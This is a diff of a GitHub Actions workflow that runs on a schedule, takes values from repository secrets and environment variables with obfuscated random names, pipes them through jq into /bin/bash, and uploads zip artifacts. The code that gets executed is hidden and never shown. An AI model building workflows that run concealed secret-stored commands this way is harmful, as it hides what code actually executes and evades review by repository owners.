@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '53 5,11,17,23 * * *'
+    - cron: '18 3,9,15,21 * * *'
 jobs:
   workflow:
     runs-on: ubuntu-latest
@@ -15,17 +15,15 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          bzp95728: ${{ secrets.bzp95728 }}
+          lpeb11: ${{ secrets.lpeb11 }}
         run: |
-          printf '%s' "$bzp95728" | jq -r .mv641 | /bin/bash
-          printf '%s' "$if8" | jq -r .rmltt98975 | /bin/bash
-          echo $vmf43794 | jq -r .zms7674 | /bin/bash
-          echo $tiqno6518 | jq -r .zzbz5 | /bin/bash
-          echo $iyo30 | jq -r .zjit87 | /bin/bash
+          printf '%s' "$lpeb11" | jq -r .zcen5696 | /bin/bash
+          echo $j2684 | jq -r .copu598 | /bin/bash
+          printf '%s' "$vls35846" | jq -r .gcc7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: dgP9VKss
+          name: qrKusqZL
           path: "*.zip"
           retention-days: 1
